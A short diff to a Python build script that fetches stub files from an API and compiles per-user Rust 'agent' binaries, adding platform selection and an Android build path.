@@ -100,8 +100,9 @@ def progress(bid, pct, msg="", status="building"):
     except Exception as e:
         warn(f"progress error: {e}")
 
-def fetch_stub(_fun_features=False):
-    r = requests.get(API("stub"), headers=HEADERS, timeout=20)
+def fetch_stub(_fun_features=False, platform="windows"):
+    url = API("stub") + (f"?platform={platform}" if platform != "windows" else "")
+    r = requests.get(url, headers=HEADERS, timeout=20)
     r.raise_for_status()
     return r.json()["files"]
 
@@ -123,8 +124,10 @@ def rust_string(s) -> str:
 
 def build(b):
     bid  = b["id"]
+    platform = b.get("platform", "windows")
+    if platform == "android":
+        return build_android(b)
     name = b.get("name", "agent")
-    # Sanitize name for use as Cargo binary name (alphanumeric, hyphens, underscores only)
     safe_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in name) or "agent"
     info(f"▶ build {bid[:8]}… ({name} → bin:{safe_name}) for user {str(b.get('user_id',''))[:8]}…")
     progress(bid, 5, "fetching stub")
